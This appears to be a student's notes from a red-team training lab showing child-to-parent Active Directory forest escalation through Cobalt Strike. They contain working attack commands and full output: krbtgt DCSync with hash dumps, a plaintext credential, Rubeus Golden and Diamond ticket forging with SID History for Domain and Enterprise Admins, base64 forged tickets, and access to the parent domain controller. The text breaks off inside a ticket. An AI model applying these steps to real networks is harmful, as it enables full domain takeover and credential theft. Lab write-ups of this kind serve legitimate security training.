When a child domain is added to a forest, it automatically creates a transitive, two-way trust with its parent. This can be found in the lab where dev.cyberbotic.io is a child domain of cyberbotic.io.
```powershell
beacon> getuid
[*] You are DEV\bfarmer
```
`import` Powerview
`beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1`

```powershell
beacon> powerpick Get-DomainTrust
[+] host called home, sent: 10 bytes
[*] Tasked beacon to run: Get-DomainTrust (unmanaged)
[+] host called home, sent: 138048 bytes
[+] received output:

SourceName      : dev.cyberbotic.io
TargetName      : cyberbotic.io
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 8/15/2022 4:00:00 PM
WhenChanged     : 12/19/2023 9:21:30 PM

SourceName      : dev.cyberbotic.io
TargetName      : dev-studio.com
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : 
TrustDirection  : Inbound
WhenCreated     : 8/16/2022 9:52:37 AM
WhenChanged     : 11/2/2023 9:48:43 AM
```
SourceName is the current domain, TargetName is the foreign domain, TrustDirection is the trust direction (bidirectional is two-way), and TrustAttributes: WITHIN_FOREST lets us know that both of these domains are part of the same forest which implies a parent/child relationship.

If we have Domain Admin privileges in the child, we can also gain Domain Admin privileges in the parent using a TGT with a special attribute called SID History.  SID History was designed to support migration scenarios, where a user would be moved from one domain to another.  To preserve access to resources in the "old" domain, the user's previous SID would be added to the SID History of their new account.  When creating such a ticket, the SID of a privileged group (EAs, DAs, etc) in the parent domain can be added that will grant access to all resources in the parent.

This can be achieved using either a Golden or Diamond Ticket.

### Golden Ticket

The process is the same as creating Golden Tickets previously, the only additional information required is the SID of a target group in the parent domain.

```powershell

beacon> powerpick  Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid
[*] Tasked beacon to run:  Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid (unmanaged)
[+] host called home, sent: 138058 bytes
[+] received output:

objectsid                                  
---------                                  
S-1-5-21-2594061375-675613155-814674916-512

beacon> powerpick Get-DomainController -Domain cyberbotic.io | select Name
[+] host called home, sent: 10 bytes
[*] Tasked beacon to run: Get-DomainController -Domain cyberbotic.io | select Name (unmanaged)
[+] host called home, sent: 138048 bytes
[+] received output:

Name              
----              
dc-1.cyberbotic.io

```
follow along with [[Penetration Testing v2/crto_Defender/2. WKSTN2 - 1/14. Domain Dominance/3. Golden Tickets|3. Golden Tickets]] to pull `aes` and `object SID` information:
1st `impersonate` a `DA`
```powershell
beacon> make_token DEV\nlamb F3rrari
[*] Tasked beacon to create a token for DEV\nlamb
[+] host called home, sent: 35 bytes
[+] Impersonated DEV\nlamb (netonly)
```
`dcsync` to get a `krbtgt` information
```powershell
[12/22 20:47:12] beacon> dcsync dev.cyberbotic.io DEV\krbtgt
[12/22 20:47:13] [*] Tasked beacon to run mimikatz's @lsadump::dcsync /domain:dev.cyberbotic.io /user:DEV\krbtgt command
[12/22 20:47:13] [+] host called home, sent: 313667 bytes
[12/22 20:47:14] [+] received output:
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 8/15/2022 4:01:04 PM
Object Security ID   : S-1-5-21-569305411-121244042-2357301523-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9fb924c244ad44e934c390dc17e02c3d
    ntlm- 0: 9fb924c244ad44e934c390dc17e02c3d
    lm  - 0: 207d5e08551c51892309c0cf652c353b

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 550703b3096dce5b5bdc9b735b79ee30

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e
      aes128_hmac       (4096) : 6fb62ed56c7de778ca5e4fe6da6d3aca
      des_cbc_md5       (4096) : 629189372a372fda

* Primary:Kerberos *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Credentials
      des_cbc_md5       : 629189372a372fda

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  82d27e18e5a51b359151719075b8efe6
    02  cacfaa14338412f71c5fc49ab4e1d50f
    03  a7ec666072cde603a927ed8ac683c337
    04  82d27e18e5a51b359151719075b8efe6
    05  cacfaa14338412f71c5fc49ab4e1d50f
    06  9e5eb5ea22776f75944637a664825a15
    07  82d27e18e5a51b359151719075b8efe6
    08  c723218f35f1568e2916d31e9bf9a7bf
    09  c723218f35f1568e2916d31e9bf9a7bf
    10  8131eb31cbeb570d96532ae55dbfa418
    11  1481ee3e83e68c4a4568e05758f01780
    12  c723218f35f1568e2916d31e9bf9a7bf
    13  2a730dd5bcc9b3561acfc500d6e855d3
    14  1481ee3e83e68c4a4568e05758f01780
    15  098e6f209b48d9d3338075ae91a37d44
    16  098e6f209b48d9d3338075ae91a37d44
    17  83834e22cfe70b6d2e17612840873048
    18  0542f8bf328626961ece6ffe2f7e104b
    19  c056ce79490f266b9379e9777fa482a0
    20  70850aab87c42c75b60f8084c2c19901
    21  7c4c9dc2a43a232fec42280344fdce23
    22  7c4c9dc2a43a232fec42280344fdce23
    23  6cd9bcf9e63591df5d18f9de3c972af5
    24  73a23dbb97eac22f5075dc9781d7721b
    25  73a23dbb97eac22f5075dc9781d7721b
    26  8ae72fdbb2e6cea2b017c90856891cad
    27  a6dc866ec7b1ccdce86cea695c74ccaf
    28  87664d84ea3a2993101d13f2b2825a9e
    29  bd839cda643ebdb4e8974ac010270395
```
rip the `aes256_hmac` and `object_sid` *note: the object SID has the `502` taken off of it*
the `target_sid` is `/sids:S-1-5-21-2594061375-675613155-814674916-512` and is the `DA` object

run this `cmd` in `ATTACKER DESKTOP` powershell session
```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /sids:S-1-5-21-2594061375-675613155-814674916-512 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : DEV.CYBERBOTIC.IO (DEV)
[*] SID            : S-1-5-21-569305411-121244042-2357301523
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-2594061375-675613155-814674916-512
[*] ServiceKey     : 51D7F328ADE26E9F785FD7EEE191265EBC87C01A4790A7F38FB52E06563D4E7E
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : 51D7F328ADE26E9F785FD7EEE191265EBC87C01A4790A7F38FB52E06563D4E7E
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : dev.cyberbotic.io

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@dev.cyberbotic.io'

[*] AuthTime       : 22/12/2023 20:57:05
[*] StartTime      : 22/12/2023 20:57:05
[*] EndTime        : 23/12/2023 06:57:05
[*] RenewTill      : 29/12/2023 20:57:05

[*] base64(ticket.kirbi):

      doIFmDCCBZSgAwIBBaEDAgEWooIEczCCBG9hggRrMIIEZ6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFkZXYuY3liZXJib3RpYy5pb6OCBCEwggQdoAMCARKhAwIBA6KCBA8EggQL/zes0Xh3bAjkeUltXxOFMrMbpJ42Dah7X2sMwRQeRL+BE0dZF5Qop2tkhXHZXuuikCTkmFTc8NxElP3q/8viATf/yN/bFVhGXrNuFzP63RT1vNtLOX4iryjM5OW4xQ8ojAgK6N0jmRJgt9GRJEvc2asGJGC6tDBJauclETHGk0Bg+SP1tYaX26FGmKQYamCKi1eerb8swVszbbBJJvHDbUUKkSm335Zi/5qFgCZr96ARH7g2kWQb0huSqhII4Bq4X9nNa7mp+pymsaHMJelPkDnJM62opVjcGuyvloYGW18O4t0e996gmCz9RQj6a9R8J5u1zrPZyn8+UmMNGVeV/dos69vk9MeXeOl4YWXv5ya56Z2ingAsoizgN3kRVwZL5wkv+k3XhaoP4uWsnzP3Un8PzJOAWHMZw4AR2ypV4LppY7n1VTrSuVKKMMcPgJajx91rZonnmAMhsmLpeMJX9jCBLYgqCtXYGCcSlXOcT6HJh7m2GQNqlEZNzfMCUV6s2UxSwFKidO4t3SRsULEZ8bWDP6Jq/gAP0CLBAFmCmAxcYg53UMeGzzKGRslHzc28Zm1e1r+/NGBVXkkuZpFMMgrNCpw9UC4UbV8856zVdxrYvWKNzKLpltkAWWcWA4a4Jb4Swg4s1rsus38I6TXUnC43t6laMWGQW5axhS66PRzNskdtV9zdLccFhnusFfrY1z9d24jlTWRcHL4LOR07lr8gqq7UZb7aqz0QNn0l53N/UAY7vtleOd8lLiJBMoYo/Z1sBI1GFCg6I8mYuDUxI/oDkOYcbhgVbFriL7yNlvlSRTtuDYJXALxMxRhI6VMClC+nymxAa0NaQxT2AJSt4iQcD/PdqLaumqFYSsL5mN3KPhg6qHTYWLYdW/pWiciRLBMxDZ3EGRMOiQKKTGRbw4GybMWEkE5iWHbe4c+1A4Kem9WGEtVLZniW76+pq+rGCQXpevnsEpCvG3crPmRmnRUvDjGd0mVNGiwaB3DijBr7s1Nrjm1lCRljHLQQd+qIj1oUTuoGBc7Zgc8t6353kJmhUkyj/4YIc3bdsKHs8Bi4aA695LkuNWrNTxHqKekWeI80mTJ0ab4883eO//I+J/kIVkO9k0XCI9/gjgODRa0MdPWWzDJoZaD5mKRc1fJAOQWCHkYuNO9xIle+aGVx1ZeUBPBjR9ZDJYou0pukyp6bQvjucB2spTXLRDoRCqfmmzi0BWhXNKF5MuavlQZ646ihoVvmILnNvaqzmKISyYjg8v4bHevKv3ovUgv4lNF7C/5Wq2IQtKcWVhDjc/RrI7eWge0FIyXRmpuFEgX5bVdzq2HVCgcSbWzsh17L94OnJodX9uCXhPpg9tDi/4LOgXVQHqkGzwMVP42Eo4IBDzCCAQugAwIBAKKCAQIEgf99gfwwgfmggfYwgfMwgfCgKzApoAMCARKhIgQg9IfTTpsvS8EhCL0ugf5iq8qXBrkEpRNprNsw+84vqAuhExsRREVWLkNZQkVSQk9USUMuSU+iGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4AAApBEYDzIwMjMxMjIyMjA1NzA1WqURGA8yMDIzMTIyMjIwNTcwNVqmERgPMjAyMzEyMjMwNjU3MDVapxEYDzIwMjMxMjI5MjA1NzA1WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRZGV2LmN5YmVyYm90aWMuaW8=
```
Then import it into a logon session and use it to access the domain controller in the parent.
```powershell
[12/22 21:16:30] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFmDCCBZSgAwIBBaEDAgEWooIEczCCBG9hggRrMIIEZ6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFkZXYuY3liZXJib3RpYy5pb6OCBCEwggQdoAMCARKhAwIBA6KCBA8EggQL/zes0Xh3bAjkeUltXxOFMrMbpJ42Dah7X2sMwRQeRL+BE0dZF5Qop2tkhXHZXuuikCTkmFTc8NxElP3q/8viATf/yN/bFVhGXrNuFzP63RT1vNtLOX4iryjM5OW4xQ8ojAgK6N0jmRJgt9GRJEvc2asGJGC6tDBJauclETHGk0Bg+SP1tYaX26FGmKQYamCKi1eerb8swVszbbBJJvHDbUUKkSm335Zi/5qFgCZr96ARH7g2kWQb0huSqhII4Bq4X9nNa7mp+pymsaHMJelPkDnJM62opVjcGuyvloYGW18O4t0e996gmCz9RQj6a9R8J5u1zrPZyn8+UmMNGVeV/dos69vk9MeXeOl4YWXv5ya56Z2ingAsoizgN3kRVwZL5wkv+k3XhaoP4uWsnzP3Un8PzJOAWHMZw4AR2ypV4LppY7n1VTrSuVKKMMcPgJajx91rZonnmAMhsmLpeMJX9jCBLYgqCtXYGCcSlXOcT6HJh7m2GQNqlEZNzfMCUV6s2UxSwFKidO4t3SRsULEZ8bWDP6Jq/gAP0CLBAFmCmAxcYg53UMeGzzKGRslHzc28Zm1e1r+/NGBVXkkuZpFMMgrNCpw9UC4UbV8856zVdxrYvWKNzKLpltkAWWcWA4a4Jb4Swg4s1rsus38I6TXUnC43t6laMWGQW5axhS66PRzNskdtV9zdLccFhnusFfrY1z9d24jlTWRcHL4LOR07lr8gqq7UZb7aqz0QNn0l53N/UAY7vtleOd8lLiJBMoYo/Z1sBI1GFCg6I8mYuDUxI/oDkOYcbhgVbFriL7yNlvlSRTtuDYJXALxMxRhI6VMClC+nymxAa0NaQxT2AJSt4iQcD/PdqLaumqFYSsL5mN3KPhg6qHTYWLYdW/pWiciRLBMxDZ3EGRMOiQKKTGRbw4GybMWEkE5iWHbe4c+1A4Kem9WGEtVLZniW76+pq+rGCQXpevnsEpCvG3crPmRmnRUvDjGd0mVNGiwaB3DijBr7s1Nrjm1lCRljHLQQd+qIj1oUTuoGBc7Zgc8t6353kJmhUkyj/4YIc3bdsKHs8Bi4aA695LkuNWrNTxHqKekWeI80mTJ0ab4883eO//I+J/kIVkO9k0XCI9/gjgODRa0MdPWWzDJoZaD5mKRc1fJAOQWCHkYuNO9xIle+aGVx1ZeUBPBjR9ZDJYou0pukyp6bQvjucB2spTXLRDoRCqfmmzi0BWhXNKF5MuavlQZ646ihoVvmILnNvaqzmKISyYjg8v4bHevKv3ovUgv4lNF7C/5Wq2IQtKcWVhDjc/RrI7eWge0FIyXRmpuFEgX5bVdzq2HVCgcSbWzsh17L94OnJodX9uCXhPpg9tDi/4LOgXVQHqkGzwMVP42Eo4IBDzCCAQugAwIBAKKCAQIEgf99gfwwgfmggfYwgfMwgfCgKzApoAMCARKhIgQg9IfTTpsvS8EhCL0ugf5iq8qXBrkEpRNprNsw+84vqAuhExsRREVWLkNZQkVSQk9USUMuSU+iGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4AAApBEYDzIwMjMxMjIyMjA1NzA1WqURGA8yMDIzMTIyMjIwNTcwNVqmERgPMjAyMzEyMjMwNjU3MDVapxEYDzIwMjMxMjI5MjA1NzA1WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRZGV2LmN5YmVyYm90aWMuaW8=
[12/22 21:16:34] [+] host called home, sent: 554696 bytes
[12/22 21:16:35] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


[*] Action: Create Process (/netonly)


[*] Using DEV\nlamb:FakePass

[*] Showing process : False
[*] Username        : nlamb
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 10836
[+] Ticket successfully imported!
[+] LUID            : 0x72ecc2
```
`steal_token` 10836
```powershell
beacon> steal_token 10836
[*] Tasked beacon to steal token from PID 10836
[+] host called home, sent: 12 bytes
[+] Impersonated DEV\bfarmer
```
Then import it into a logon session and use it to access the domain controller in the parent.
```powershell
[12/22 21:17:34] beacon> ls \\dc-1.cyberbotic.io\c$
[12/22 21:17:34] [*] Tasked beacon to list files in \\dc-1.cyberbotic.io\c$
[12/22 21:17:34] [+] host called home, sent: 41 bytes
[12/22 21:17:34] [*] Listing: \\dc-1.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 15:26:54   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     05/08/2021 08:20:24   PerfLogs
          dir     09/26/2023 09:07:25   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     12/19/2023 21:48:50   ProgramData
          dir     08/15/2022 15:07:48   Recovery
          dir     08/24/2022 11:05:32   Shares
          dir     12/19/2023 21:37:27   System Volume Information
          dir     08/15/2022 15:09:04   Users
          dir     09/26/2023 09:10:03   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 12kb     fil     12/22/2023 19:37:16   DumpStack.log.tmp
 1kb      fil     09/25/2023 19:07:33   ExtADSch.log
 384mb    fil     12/22/2023 19:37:16   pagefile.sys
```

### Diamond Ticket

Listing all `SID`'s that could be targeted
```powershell
[12/22 21:26:00] beacon> powerpick  Get-DomainGroup -Domain cyberbotic.io -Properties ObjectSid
[12/22 21:26:00] [+] host called home, sent: 10 bytes
[12/22 21:26:00] [*] Tasked beacon to run:  Get-DomainGroup -Domain cyberbotic.io -Properties ObjectSid (unmanaged)
[12/22 21:26:00] [+] host called home, sent: 138048 bytes
[12/22 21:26:05] [+] received output:

objectsid                                   
---------                                   
S-1-5-32-544                                
S-1-5-32-545                                
S-1-5-32-546                                
S-1-5-32-550                                
S-1-5-32-551                                
S-1-5-32-552                                
S-1-5-32-555                                
S-1-5-32-556                                
S-1-5-32-558                                
S-1-5-32-559                                
S-1-5-32-562                                
S-1-5-32-568                                
S-1-5-32-569                                
S-1-5-32-573                                
S-1-5-32-574                                
S-1-5-32-575                                
S-1-5-32-576                                
S-1-5-32-577                                
S-1-5-32-578                                
S-1-5-32-579                                
S-1-5-32-580                                
S-1-5-32-582                                
S-1-5-21-2594061375-675613155-814674916-515 
S-1-5-21-2594061375-675613155-814674916-516 
S-1-5-21-2594061375-675613155-814674916-518 
S-1-5-21-2594061375-675613155-814674916-519 
S-1-5-21-2594061375-675613155-814674916-517 
S-1-5-21-2594061375-675613155-814674916-512 
S-1-5-21-2594061375-675613155-814674916-513 
S-1-5-21-2594061375-675613155-814674916-514 
S-1-5-21-2594061375-675613155-814674916-520 
S-1-5-21-2594061375-675613155-814674916-553 
S-1-5-32-549                                
S-1-5-32-548                                
S-1-5-32-554                                
S-1-5-32-557                                
S-1-5-32-560                                
S-1-5-32-561                                
S-1-5-21-2594061375-675613155-814674916-571 
S-1-5-21-2594061375-675613155-814674916-572 
S-1-5-21-2594061375-675613155-814674916-521 
S-1-5-21-2594061375-675613155-814674916-498 
S-1-5-21-2594061375-675613155-814674916-522 
S-1-5-21-2594061375-675613155-814674916-525 
S-1-5-21-2594061375-675613155-814674916-526 
S-1-5-21-2594061375-675613155-814674916-527 
S-1-5-21-2594061375-675613155-814674916-1101
S-1-5-21-2594061375-675613155-814674916-1102
S-1-5-21-2594061375-675613155-814674916-1106
S-1-5-21-2594061375-675613155-814674916-1107
S-1-5-21-2594061375-675613155-814674916-1108
S-1-5-21-2594061375-675613155-814674916-1109
S-1-5-21-2594061375-675613155-814674916-1110
S-1-5-21-2594061375-675613155-814674916-1111
S-1-5-21-2594061375-675613155-814674916-1112
S-1-5-21-2594061375-675613155-814674916-1113
S-1-5-21-2594061375-675613155-814674916-1114
S-1-5-21-2594061375-675613155-814674916-1115
S-1-5-21-2594061375-675613155-814674916-1116
S-1-5-21-2594061375-675613155-814674916-1117
S-1-5-21-2594061375-675613155-814674916-1118
S-1-5-21-2594061375-675613155-814674916-1119
S-1-5-21-2594061375-675613155-814674916-1120
S-1-5-21-2594061375-675613155-814674916-1121
S-1-5-21-2594061375-675613155-814674916-1122
S-1-5-21-2594061375-675613155-814674916-1123
S-1-5-21-2594061375-675613155-814674916-1124
S-1-5-21-2594061375-675613155-814674916-1135
S-1-5-21-2594061375-675613155-814674916-9103
```
`ConvertFRom-SID` against the `SID` that the course wants us to use is `CYBER\Enterprise Admins`
```powershell
beacon> powerpick ConvertFRom-SID  S-1-5-21-2594061375-675613155-814674916-519
[*] Tasked beacon to run: ConvertFRom-SID  S-1-5-21-2594061375-675613155-814674916-519 (unmanaged)
[+] host called home, sent: 10 bytes
[+] host called home, sent: 138048 bytes
[+] received output:
CYBER\Enterprise Admins

```
`krbkey` is the `aes_256` from the beginning query 
The Rubeus `diamond` command also has a `/sids` parameter, with which we can supply the extra SIDs we want in our ticket.
```powershell
[12/22 21:35:37] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-2594061375-675613155-814674916-519 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap
[12/22 21:35:42] [*] Tasked beacon to run .NET program: Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-2594061375-675613155-814674916-519 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap
[12/22 21:35:42] [+] host called home, sent: 551060 bytes
[12/22 21:35:43] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 

[*] Action: Diamond Ticket

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/dc-2.dev.cyberbotic.io'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: IaExRqVFv4WkfztYyVh5DKp0Q5+2LA+BSNzY3wY0lOA=
[+] Successfully decrypted the authenticator

[12/22 21:35:43] [+] received output:
[*] base64(ticket.kirbi):

      doIFzjCCBcqgAwIBBaEDAgEWooIExTCCBMFhggS9MIIEuaADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBHMwggRvoAMCARKhAwIBAqKCBGEEggRdegJOIUOW3rbvK9zDSMNZJmSfYntf2Hfo1ZzBHgIXflaUvuLZTJRQoonG33xNqWKWouBvlXp6yHyj/WkT8182aLHmP9z48vpIJXiNT+Ms2/1tdfDhLWoNYRD2jM0mldQz1mAkxmDwHsVaxop6sl9f55WzncvRi8jolwqu7JmtYwucIBhvpr8Xa+u8CamfidJA/VnFqB9gvODzJjAh90sy4Ze8pvuyVkD5wZedYMC54L0efOScLg4KbB/pbujsEntoS3fl9ysdNV9PJl4MSalyDdWEJWBn52KCrCdP43mUxkIyZeZAnUfX7rSvD5QAUGwHgjPd3lo7UYGSF2gc6xxd/jFm0VS746r/DT813pSrtZMT0AoQ+53O/p/kX2VZBvrCc072W6xxnUHZ+343+fH9vx/S+F2B4iYS43NUhxvhlJAkqJ+3Mxuqjm3pYqbev6WsIT5j5utCSbZ0R3NuRN0KOWZ1Djm7tFWYv312wvwyZlJXrpBCpH6pgZ9TxESqxWmHzbZgnGpLJGX/MKgpiHlObj8uQ0qAW8MkWemI2FcC3pGrtlJYEI0ZxC5HjFZqbtukj+vu8PfYRJiSL2+01PiD+vFAfztpYBRAMepaID1BzFmulBWYLYBF/mG+FuNY5+afj/L2mnZRrEPkKF41a9b418mfjzYgpVsybLyjIgucMzE6+ir6dvRFjiT5zphNfC16KcSW4AhCj4d9+xftlbJhYT7FWl3vJuq9JYtnFBoyMUJk1wcyCZNzlaVX3EzqhluDOFviyzna7/MsbUXDFdY16MsZd082FvgNwbjzG7iM8ZERfDYVsBYyqMcXnpojzC/iVBUDYl45uhjnxtV768BKMYoCNabJ/0T/2R2WvY8I61cjtNhlgJY7ReO4ykgOoby4rugTGJKm7ql0R6gpSm62QYbxAFq1Uf+d8N/1d5RjPsbfq6Nh6sheymBVxy0eDpwwFg1hQfWokd00A/vv4+1Mnz/SaCs3S5iMVuuN1w5hR4LH29b0RNXsDjijuKKIApDzZDMsGPSaXorPzK1/VyV/FBLgItpncnQX8nMw48Z4emEfVKiWS6ZDS2Q/JsZrhGWTmpzJEkmpVHxlirkxtwIFNzYpf3F5dT4cHPzgBtNAEZeWPp9qNUqOPmmUGQ53lICyq/0VpuWbP9cZLUsjjsMfI4HcfBGZtvPgD/X3uR0PoZvwaeXUuGWW2zLyL3RfQA95CfjVmOF1wh+JfRssyocN6mtCKvdCALjJhyQ53RjM9/w0MrF2JF2M3ebMHGkd89s55Knb/FYBtzxLp0sFBHHNruNNS4IX6/ESnFHQVhdm7J1qJfvbIF8sk4Vw9raYBW9qg+ZaHejrAHYvow1botkDnLW3ws6xOCIIL03aWOBcFQ3F48ZCd6e04eH8KaiB75nFjwJGQrykKcT0TTHjxcZWQTEnhSxzLmzxkHMvlqJ6E1TwwfO+qlmTW3F+Py3hoAcmkli3tPyWyqOdzQewDaOB9DCB8aADAgEAooHpBIHmfYHjMIHgoIHdMIHaMIHXoCswKaADAgESoSIEIPNXowpIzBEnIAujgSKsFa447HE5Vb9gzUw1zXTaEzUzoRMbEURFVi5DWUJFUkJPVElDLklPohQwEqADAgEBoQswCRsHYmZhcm1lcqMHAwUAYKEAAKURGA8yMDIzMTIyMjIwMjEwNFqmERgPMjAyMzEyMjMwNjIxMDNapxEYDzIwMjMxMjI5MjAyMTAzWqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8=

[*] Decrypting TGT

[12/22 21:35:43] [+] received output:
[*] Retreiving PAC
[*] Modifying PAC
[*] Signing PAC
[*] Encrypting Modified TGT

[*] base64(ticket.kirbi):

      doIGAjCCBf6gAwIBBaEDAgEWooIE8zCCBO9hggTrMIIE56ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBKEwggSdoAMCARKhAwIBA6KCBI8EggSLpo+ipvpa3xcJeBQ9MGo3ZXBgM7SKLMWR/8dCr6o5XucsniPeCT/5LMWWknYMv/8zMxOzcIJprWXibY5XjlEOJeYcGnJhuzO3Wf/9nzBbOGXFfHio0STRWMY5iQ/wRhlj5uQawq18fM0Fai5Tm6BOtXz90qlNwhupGa3NClAObwc3F+pP3TYK9WGUsbTN1zFtOUNV7InjodltM7p1klis36jS0W8lrFt+bD+aY4DxApos8nsbO+a0WWPY8trJU54I0Pec/DMGABS5EbvtlKa2ZgfVo8qJu4dvdwaGyAzMceZrBjqQAZbmlSTLhwp9yRbixV9nTpknmAThw52jF9UDo5eHPxwzJVgxELH83irKt7D9+0EIRSlfHCSeoP6cPSjeeJzycRWfn1lwHRKvjZYv4V9rsnfSoDrVQX7687qEpVXttWaSLuHhsphawE7FVlKSgxFb7J2vvSZKTRQTWSDOtiBm59OJWaB1b/NhIAzvyW9za9YV7VwHuKwJ0C/DgIU/glqVsgKOCRN/+1ef78xDA7qmT1rMNZ9ORnzJKF0AItQSgj7CdsaP7O+Qvptk5oBJXqARuKHni0ytOQu/plw8avKfZhAh939z0OdXL/pYNDJkkG+/0m3aU+EUSc+puEeJXSJf3/DvsJ67ylUexytnpQ6xoESN2OXM+N1ZXH12mf8Ql0X/ziAuuaAIArxP5ryzmSyUHEWSiDHahqK7mF/qsaVo4wE68xFCL2tkhYsTCO2ywnuL/Bf55rEynkJoiCGrMiG4t2pV+zW4PBbSExRMgtuejQXIVrytt061/efW1H11ajalouMqQYQw50RGlN7MkJlRfOl9AaTg4or5c4FPMfhzsHS+EJY9KobzypUwWgj73ly92xevKuk0RZyC2u/MzWpbAh40zKL73Om+S1l+msBmzhH+IRcdysYDdKdI3ZU994Zk94GMR6Av17qcQcJsMBxnCe1NSzK8UAIsTVw3Xr/ScBrbOMThW7DK1UQW0it2sYeijDO9tpV5lJpGY7EqBvJRMPqHo7Ub/krm3LRS77fPS7Y8/VYhRBgUV/s1YV16n+DSOhhijGIa5S8S77I2aeQXL3hYIfgc1LEOCOApRmpYZnUB1upIYQwKhIOi2Tbv0BntWWtfiWWhaakvg9vZ8YviQoCAUsfLYTDaT7HTh7w+c94R0rG6swK1sXQ5H65A3TdenfQ5c1lqwu4Trhn83uDoWe05r0CU8xqMEr3JM6OX6kSEogJG/cNytYhTykmOQuIZoFQVgxaorK/r9GfsBBMjrGZVo0rgZ5YVV0Pe1O5lhaWZul5/Y54VEO/VroHm0IAhzzt625rxU/qTFCXD+oWJRFTqCfC2SBAGH4FgCSV8tQPq5scf7NMtY2mp6sZnrDGqtqgw5zDW0dLZTRzG64E/foIyvUvGrXuuruTSEveCXSl